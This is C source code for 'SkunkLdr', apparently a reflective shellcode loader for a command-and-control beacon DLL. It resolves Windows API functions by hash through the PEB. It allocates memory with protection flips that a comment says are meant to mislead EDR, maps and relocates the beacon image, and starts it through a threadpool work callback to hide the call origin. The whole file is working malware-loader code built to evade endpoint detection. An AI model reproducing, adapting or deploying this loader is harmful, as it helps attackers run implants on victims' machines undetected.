#include "Skunk.h"
#include "Ldr.h"

typedef struct _BEACON_ARGS {
    UINT_PTR pBeaconDllMain;
    UINT_PTR hinstDLL;
} BEACON_ARGS, *PBEACON_ARGS;

EXTERN_C
FUNC
VOID
WINAPI
SkunkLdr(VOID) {
    INSTANCE                instance        = {0};
    PVOID                   pSkunkBase      = NULL;
    PVOID                   pBeacon         = NULL;
    PIMAGE_NT_HEADERS       pImgNtHeaders   = NULL;
    PIMAGE_SECTION_HEADER   pImgSecHeader   = NULL;
    PIMAGE_DATA_DIRECTORY   pImgDataDir     = NULL;
    LPVOID                  pMemAddr        = NULL;
    SIZE_T                  sMemSize        = 0;
    PVOID                   pMemSec         = NULL;
    SIZE_T                  sMemSecSize     = 0;
    DWORD                   dwMemPrt        = 0;
    ULONG                   ullOldPrt       = 0;

    // Some of the code below might show an error in your IDE. Ignore it, I promise it works

    // Compute base of loader and beacon lib
    pSkunkBase = RipStart();
    pBeacon = RipEnd();
    if (!pBeacon) {
        return;
    }

    // Resolve needed functions and modules
    if (!(instance.Modules.Ntdll = LdrModulePeb(HASHW(L"ntdll.dll")))) {
        return;
    }
    if (!(instance.Win32.LdrLoadDll = LdrFunction(instance.Modules.Ntdll, HASHA("LdrLoadDll")))) {
        return;
    }
    if (!(instance.Win32.LdrGetProcedureAddress = LdrFunction(instance.Modules.Ntdll, HASHA("LdrGetProcedureAddress")))) {
        return;
    }
    if (!(instance.Win32.NtFreeVirtualMemory = LdrFunction(instance.Modules.Ntdll, HASHA("NtFreeVirtualMemory")))) {
        return;
    }
    if (!(instance.Win32.NtAllocateVirtualMemory = LdrFunction(instance.Modules.Ntdll, HASHA("NtAllocateVirtualMemory")))) {
        return;
    }
    if (!(instance.Win32.NtProtectVirtualMemory = LdrFunction(instance.Modules.Ntdll, HASHA("NtProtectVirtualMemory")))) {
        return;
    }
    if (!(instance.Win32.RtlAllocateHeap = LdrFunction(instance.Modules.Ntdll, HASHA("RtlAllocateHeap")))) {
        return;
    }
    if (!(instance.Win32.RtlFreeHeap = LdrFunction(instance.Modules.Ntdll, HASHA("RtlFreeHeap")))) {
        return;
    }
    if (!(instance.Win32.TpAllocWork = LdrFunction(instance.Modules.Ntdll, HASHA("TpAllocWork")))) {
        return;
    }
    if (!(instance.Win32.TpPostWork = LdrFunction(instance.Modules.Ntdll, HASHA("TpPostWork")))) {
        return;
    }
    if (!(instance.Win32.TpReleaseWork = LdrFunction(instance.Modules.Ntdll, HASHA("TpReleaseWork")))) {
        return;
    }

    if (!(instance.Modules.Kernel32 = LdrModulePeb(HASHW(L"kernel32.dll")))) {
        return;
    }
    if (!(instance.Win32.LoadLibraryA = LdrFunction(instance.Modules.Kernel32, HASHA("LoadLibraryA")))) {
        return;
    }
    if (!(instance.Win32.WaitForSingleObject = LdrFunction(instance.Modules.Kernel32, HASHA("WaitForSingleObject")))) {
        return;
    }

    // Allocate memory for beacon lib
    pImgNtHeaders = C_PTR(pBeacon + ((PIMAGE_DOS_HEADER) pBeacon)->e_lfanew);
    sMemSize = pImgNtHeaders->OptionalHeader.SizeOfImage;

    // EDR can see original memory protection. Start with RX allocation, switch to RW, then revert to RX
    if (NT_SUCCESS(instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(), &pMemAddr, 0, &sMemSize, MEM_COMMIT, PAGE_EXECUTE_READ))) {
        // Switch to RW
        instance.Win32.NtProtectVirtualMemory(NtCurrentProcess(), &pMemAddr, &sMemSize, PAGE_READWRITE, &ullOldPrt);

        // Copy beacon lib sections headers into allocated memory
        pImgSecHeader = IMAGE_FIRST_SECTION(pImgNtHeaders);
        for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID src = C_PTR(pBeacon + pImgSecHeader[i].PointerToRawData);
            LPVOID dest = C_PTR(pMemAddr + pImgSecHeader[i].VirtualAddress);
            SIZE_T size = pImgSecHeader[i].SizeOfRawData;

            if (pImgSecHeader[i].PointerToRawData + size > pImgNtHeaders->OptionalHeader.SizeOfImage || !src || !dest) {
                return;
            }

            MemCopy(dest, src, size);
        }

        // Resolve beacon lib IAT
        pImgDataDir = &pImgNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (pImgDataDir->VirtualAddress) {
            LdrResolveIAT(&instance, pMemAddr, C_PTR(pMemAddr + pImgDataDir->VirtualAddress));
        }

        // Resolve beacon lib relocations
        pImgDataDir = &pImgNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (pImgDataDir->VirtualAddress) {
            LdrRelocateSections(pMemAddr, pImgNtHeaders->OptionalHeader.ImageBase, C_PTR(pMemAddr + pImgDataDir->VirtualAddress));
        }

        // Set memory protections
        for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++) {
            pMemSec = C_PTR(pMemAddr + pImgSecHeader[i].VirtualAddress);
            sMemSecSize = pImgSecHeader[i].SizeOfRawData;
            dwMemPrt = 0;
            ullOldPrt = 0;

            if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                dwMemPrt = PAGE_WRITECOPY;
            }
            if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ) {
                dwMemPrt = PAGE_READONLY;
            }
            if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHeader[i].Characteristics  & IMAGE_SCN_MEM_READ)) {
                dwMemPrt = PAGE_READWRITE;
            }
            if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                dwMemPrt = PAGE_EXECUTE;
            }
            if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
                dwMemPrt = PAGE_EXECUTE_WRITECOPY;
            }
            if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
                dwMemPrt = PAGE_EXECUTE_READ;
            }
            if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
                dwMemPrt = PAGE_EXECUTE_READWRITE;
            }

            //dwMemPrt = PAGE_EXECUTE_READ;
            instance.Win32.NtProtectVirtualMemory(NtCurrentProcess(), &pMemSec, &sMemSecSize, dwMemPrt, &ullOldPrt);
        }

        // Execute beacon lib DllMain
        BOOL (WINAPI *beaconDllMain) (PVOID, PVOID, PVOID) = C_PTR(pMemAddr + pImgNtHeaders->OptionalHeader.AddressOfEntryPoint);
        beaconDllMain(pMemAddr, DLL_PROCESS_ATTACH, NULL);

        PTP_WORK WorkReturn = NULL;
        BEACON_ARGS beaconArgs = {0};
        beaconArgs.pBeaconDllMain = U_PTR(beaconDllMain);
        beaconArgs.hinstDLL = U_PTR(pMemAddr);

        // Compute pointer to ProxyCaller
        VOID (CALLBACK *proxyCaller) (PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK) = RipCaller();

        instance.Win32.TpAllocWork(&WorkReturn, (PTP_WORK_CALLBACK) proxyCaller, &beaconArgs, NULL);
        instance.Win32.TpPostWork(WorkReturn);
        instance.Win32.TpReleaseWork(WorkReturn);

        instance.Win32.WaitForSingleObject((HANDLE)-1, 5);
    }
}